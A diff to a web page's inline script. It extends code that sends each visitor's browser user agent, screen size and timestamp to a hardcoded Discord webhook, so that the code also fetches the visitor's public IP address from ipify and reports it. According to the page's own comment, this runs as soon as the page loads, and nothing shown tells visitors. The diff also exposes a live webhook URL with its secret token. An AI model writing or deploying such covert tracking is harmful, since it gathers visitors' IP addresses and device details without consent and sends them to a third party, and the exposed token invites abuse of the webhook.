@@ -24,36 +24,38 @@
 
   <script>
     // Function to send data
-    function sendData() {
-      // Collect user data
-      const userAgent = navigator.userAgent;
-      const screenWidth = window.screen.width;
-      const screenHeight = window.screen.height;
-      const data = {
-        userAgent: userAgent,
-        screenSize: `${screenWidth}x${screenHeight}`,
-        timestamp: new Date().toISOString()
-      };
+    async function sendData() {
+      try {
+        // Fetch user's public IP address using ipify API
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        const publicIP = ipData.ip;
 
-      // Discord webhook URL
-      const webhookUrl = "https://discord.com/api/webhooks/1311826289795010680/_HVnWtv_nKSen0Ih6MBvUMlPlYicQtJGIb3SAIpBPxsnyNXOtO-QHXjpq9fLId0n6JpJ";
+        // Collect other user data
+        const userAgent = navigator.userAgent;
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const data = {
+          userAgent: userAgent,
+          screenSize: `${screenWidth}x${screenHeight}`,
+          publicIP: publicIP,
+          timestamp: new Date().toISOString()
+        };
 
-      // Send data to Discord webhook
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `New user visited the page:\n**User Agent**: ${data.userAgent}\n**Screen Size**: ${data.screenSize}\n**Timestamp**: ${data.timestamp}`
-        })
-      })
-      .then(response => {
-        if (!response.ok) {
-          console.error("Failed to send data. Please check your webhook URL.");
-        }
-      })
-      .catch(error => {
-        console.error("Error:", error);
-      });
+        // Discord webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1311826289795010680/_HVnWtv_nKSen0Ih6MBvUMlPlYicQtJGIb3SAIpBPxsnyNXOtO-QHXjpq9fLId0n6JpJ";
+
+        // Send data to Discord webhook
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `New user visited the page:\n**Public IP**: ${data.publicIP}\n**User Agent**: ${data.userAgent}\n**Screen Size**: ${data.screenSize}\n**Timestamp**: ${data.timestamp}`
+          })
+        });
+      } catch (error) {
+        console.error("Error fetching IP or sending data:", error);
+      }
     }
 
     // Send data as soon as the page loads
